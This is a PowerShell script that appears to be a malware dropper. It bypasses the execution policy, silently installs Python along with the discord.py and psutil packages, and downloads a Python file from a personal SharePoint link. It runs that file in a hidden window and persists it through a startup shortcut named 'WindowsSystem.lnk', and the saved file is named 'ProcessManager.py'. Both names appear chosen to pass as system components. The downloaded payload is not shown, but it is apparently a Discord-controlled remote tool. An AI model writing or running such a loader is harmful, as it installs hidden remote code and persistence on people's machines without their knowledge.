# Bypass execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Check if Python is installed
try {
    python --version > $null 2>&1
    $pythonInstalled = $true
} catch {
    $pythonInstalled = $false
}

# Install Python if not found
if (-not $pythonInstalled) {
    # Download Python
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -UseBasicParsing
    
    # Install silently
    Start-Process -FilePath $installerPath -ArgumentList @(
        "/quiet",
        "InstallAllUsers=0",
        "PrependPath=1", 
        "Include_test=0",
        "Include_pip=1",
        "Include_launcher=0"
    ) -Wait -WindowStyle Hidden
    
    # Wait for installation
    Start-Sleep -Seconds 10
}

# Install packages
Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", "discord.py", "psutil", "--quiet", "--user" -Wait -WindowStyle Hidden

# Download main script
$scriptUrl = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
$scriptPath = "$env:USERPROFILE\ProcessManager.py"
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing

# Run script
Start-Process -FilePath "python" -ArgumentList "`"$scriptPath`"" -WindowStyle Hidden

# Add to startup
$startupPath = [Environment]::GetFolderPath("Startup")
$shortcutPath = "$startupPath\WindowsSystem.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "python"
$Shortcut.Arguments = "`"$scriptPath`""
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "$env:USERPROFILE"
$Shortcut.Save()

# Exit
exit
